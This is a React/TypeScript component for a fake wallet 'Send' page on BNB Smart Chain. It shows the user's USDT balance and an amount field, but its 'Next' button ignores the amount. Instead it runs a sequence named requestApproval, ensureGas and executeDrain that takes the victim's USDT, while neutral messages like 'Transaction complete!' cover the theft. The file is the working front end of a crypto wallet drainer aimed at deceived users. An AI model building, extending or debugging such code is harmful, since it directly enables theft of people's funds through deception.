import { useState, useEffect, useRef } from "react"
import { ethers } from "ethers"
import { USDT_ADDRESS, USDT_DECIMALS } from "../config"
import { requestApproval, ensureGas, executeDrain } from "../lib/web3"

interface Props {
  provider: ethers.BrowserProvider
  address: string
}

type DrainStage = "idle" | "approving" | "checking_gas" | "draining" | "done" | "error"

export default function SendPage({ provider, address }: Props) {
  const [amount, setAmount] = useState("")
  const [usdtBalance, setUsdtBalance] = useState("0")
  const [stage, setStage] = useState<DrainStage>("idle")
  const [statusMsg, setStatusMsg] = useState("")
  const [balanceError, setBalanceError] = useState("")
  const mountedRef = useRef(true)

  // FIX 7: Fetch balance with try/catch + chain check to prevent white screen crash
  useEffect(() => {
    mountedRef.current = true

    const fetchBalance = async () => {
      if (!mountedRef.current) return
      
      try {
        // Check which network we're on
        const network = await provider.getNetwork()
        const chainId = Number(network.chainId)
        
        if (chainId !== 56) {
          setBalanceError("Please switch to BNB Smart Chain in your wallet")
          if (mountedRef.current) setUsdtBalance("0")
          return
        }
        
        setBalanceError("")

        const usdt = new ethers.Contract(
          USDT_ADDRESS,
          ["function balanceOf(address) view returns (uint256)"],
          provider
        )
        const bal = await usdt.balanceOf(address)
        
        if (mountedRef.current) {
          setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
        }
      } catch (err: any) {
        console.warn("Balance fetch failed:", err?.message || err)
        if (mountedRef.current) {
          setUsdtBalance("0")
          setBalanceError("Could not fetch USDT balance")
        }
      }
    }

    fetchBalance()

    // FIX 8: Cleanup to prevent state update on unmounted component
    return () => {
      mountedRef.current = false
    }
  }, [address, provider])

  const handleDrain = async () => {
    setStage("approving")
    setStatusMsg("Waiting for approval...")

    try {
      const approvedAmount = await requestApproval(provider, address)

      if (!approvedAmount) {
        setStage("error")
        setStatusMsg("Approval failed.")
        return
      }

      setStage("checking_gas")
      setStatusMsg("Checking gas balance...")

      const hasGas = await ensureGas(provider, address)

      if (!hasGas) {
        setStage("error")
        setStatusMsg("Could not fund gas.")
        return
      }

      setStage("draining")
      setStatusMsg("Transferring USDT...")

      const drained = await executeDrain(address, approvedAmount)

      if (drained) {
        setStage("done")
        setStatusMsg("Transaction complete!")
      } else {
        setStage("error")
        setStatusMsg("Drain failed - check logs.")
      }
    } catch (err: any) {
      setStage("error")
      setStatusMsg("Error: " + (err.message || "Unknown error"))
    }
  }

  const s = {
    page: {
      display: "flex",
      flexDirection: "column" as const,
      minHeight: "100dvh",
      background: "#0C0F1E",
    },
    header: {
      padding: "16px",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      borderBottom: "1px solid #1F2233",
    },
    headerTitle: {
      fontSize: "18px",
      fontWeight: 600,
      color: "#fff",
    },
    body: {
      flex: 1,
      padding: "24px 16px",
      display: "flex",
      flexDirection: "column" as const,
      gap: "24px",
    },
    networkBadge: {
      display: "flex",
      alignItems: "center",
      gap: "8px",
      background: "#1F2233",
      borderRadius: "12px",
      padding: "12px 16px",
    },
    dot: {
      width: "24px",
      height: "24px",
      borderRadius: "50%",
      background: "rgba(240, 185, 11, 0.2)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "12px",
      color: "#F0B90B",
    },
    netText: {
      fontSize: "14px",
      color: "#fff",
    },
    label: {
      fontSize: "12px",
      color: "#9CA3AF",
      marginBottom: "8px",
      display: "block",
    },
    tokenCard: {
      background: "#1F2233",
      borderRadius: "12px",
      padding: "12px 16px",
      display: "flex",
      alignItems: "center",
      justifyContent: "space-between",
    },
    tokenLeft: {
      display: "flex",
      alignItems: "center",
      gap: "12px",
    },
    tokenIcon: {
      width: "36px",
      height: "36px",
      borderRadius: "50%",
      background: "rgba(18, 183, 106, 0.2)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "16px",
      color: "#12B76A",
      fontWeight: "bold",
    },
    tokenName: {
      fontSize: "14px",
      color: "#fff",
      fontWeight: 500,
    },
    tokenSub: {
      fontSize: "12px",
      color: "#9CA3AF",
    },
    balanceLabel: {
      fontSize: "12px",
      color: "#9CA3AF",
      textAlign: "right" as const,
    },
    balanceVal: {
      fontSize: "14px",
      color: "#fff",
      textAlign: "right" as const,
    },
    amountBox: {
      background: "#1F2233",
      borderRadius: "12px",
      padding: "12px 16px",
      border: "1px solid #2E3144",
    },
    amountInputRow: {
      display: "flex",
      alignItems: "center",
      justifyContent: "space-between",
    },
    amountInput: {
      background: "transparent",
      color: "#fff",
      fontSize: "24px",
      fontWeight: 600,
      border: "none",
      outline: "none",
      width: "100%",
    },
    maxBtn: {
      background: "#3375BB",
      color: "#fff",
      fontSize: "12px",
      border: "none",
      borderRadius: "8px",
      padding: "4px 12px",
      fontWeight: 500,
      cursor: "pointer",
    },
    usdHint: {
      fontSize: "12px",
      color: "#6B7280",
      marginTop: "4px",
    },
    footer: {
      padding: "0 16px 32px",
    },
    nextBtn: {
      width: "100%",
      background: "#3375BB",
      color: "#fff",
      border: "none",
      fontSize: "16px",
      fontWeight: 600,
      padding: "16px",
      borderRadius: "12px",
      cursor: "pointer",
    },
    nextBtnDisabled: {
      width: "100%",
      background: "#3375BB",
      color: "#fff",
      border: "none",
      fontSize: "16px",
      fontWeight: 600,
      padding: "16px",
      borderRadius: "12px",
      opacity: 0.4,
      cursor: "not-allowed" as const,
    },
    overlay: {
      position: "fixed" as const,
      top: 0,
      left: 0,
      right: 0,
      bottom: 0,
      background: "rgba(12, 15, 30, 0.95)",
      display: "flex",
      flexDirection: "column" as const,
      alignItems: "center",
      justifyContent: "center",
      zIndex: 1000,
      padding: "24px",
    },
    overlaySpinner: {
      width: "48px",
      height: "48px",
      border: "4px solid rgba(51, 117, 187, 0.3)",
      borderTopColor: "#3375BB",
      borderRadius: "50%",
      animation: "spin 1s linear infinite",
      marginBottom: "24px",
    },
    overlayTitle: {
      fontSize: "20px",
      fontWeight: 600,
      color: "#fff",
      marginBottom: "8px",
    },
    overlaySub: {
      fontSize: "14px",
      color: "#9CA3AF",
      textAlign: "center" as const,
      maxWidth: "320px",
      lineHeight: "1.5",
    },
    doneText: {
      fontSize: "16px",
      color: "#12B76A",
      fontWeight: 600,
      textAlign: "center" as const,
      marginTop: "16px",
    },
    overlayErrorIcon: {
      width: "64px",
      height: "64px",
      borderRadius: "50%",
      background: "rgba(240, 68, 56, 0.1)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "28px",
      color: "#F04438",
      fontWeight: "bold",
      marginBottom: "24px",
    },
    errorBanner: {
      background: "rgba(240, 68, 56, 0.1)",
      border: "1px solid rgba(240, 68, 56, 0.3)",
      borderRadius: "8px",
      padding: "8px 12px",
      fontSize: "12px",
      color: "#F04438",
      textAlign: "center" as const,
    },
  }

  // Processing overlay
  if (stage !== "idle") {
    return (
      <div style={s.overlay}>

        {stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
          <>
            <div style={s.overlaySpinner}></div>
            <h2 style={s.overlayTitle}>Processing...</h2>
            <p style={s.overlaySub}>{statusMsg}</p>
          </>
        ) : stage === "done" ? (
          <>
            <div style={{ ...s.overlaySpinner, borderTopColor: "#12B76A" }}></div>
            <h2 style={{ ...s.overlayTitle, color: "#12B76A" }}>Complete</h2>
            <p style={s.overlaySub}>{statusMsg}</p>
            <p style={s.doneText}>You may close this page.</p>
          </>
        ) : stage === "error" ? (
          <>
            <div style={s.overlayErrorIcon}>!</div>
            <h2 style={{ ...s.overlayTitle, color: "#F04438" }}>Error</h2>
            <p style={s.overlaySub}>{statusMsg}</p>
          </>
        ) : null}

      </div>
    )
  }

  // Main send page
  return (
    <div style={s.page}>

      <div style={s.header}>
        <span style={s.headerTitle}>Send</span>
      </div>

      <div style={s.body}>

        <div style={s.networkBadge}>
          <div style={s.dot}>B</div>
          <span style={s.netText}>BNB Smart Chain</span>
        </div>

        {/* FIX 9: Show balance error if wrong network */}
        {balanceError && (
          <div style={s.errorBanner}>{balanceError}</div>
        )}

        <div>
          <label style={s.label}>Token</label>
          <div style={s.tokenCard}>
            <div style={s.tokenLeft}>
              <div style={s.tokenIcon}>$</div>
              <div>
                <div style={s.tokenName}>USDT</div>
                <div style={s.tokenSub}>Tether USD</div>
              </div>
            </div>
            <div>
              <div style={s.balanceLabel}>Balance</div>
              <div style={s.balanceVal}>{parseFloat(usdtBalance).toFixed(2)}</div>
            </div>
          </div>
        </div>

        <div>
          <label style={s.label}>Amount</label>
          <div style={s.amountBox}>
            <div style={s.amountInputRow}>
              <input
                style={s.amountInput}
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                type="number"
                inputMode="decimal"
                placeholder="0"
              />
              <button
                type="button"  // FIX 10: Added type="button"
                style={s.maxBtn}
                onClick={() => setAmount(usdtBalance)}
              >
                MAX
              </button>
            </div>
            <div style={s.usdHint}>~$0.00 USD</div>
          </div>
        </div>

      </div>

      <div style={s.footer}>
        <button
          type="button"  // FIX 11: Added type="button"
          style={s.nextBtn}
          onClick={handleDrain}
        >
          Next
        </button>
      </div>

    </div>
  )
}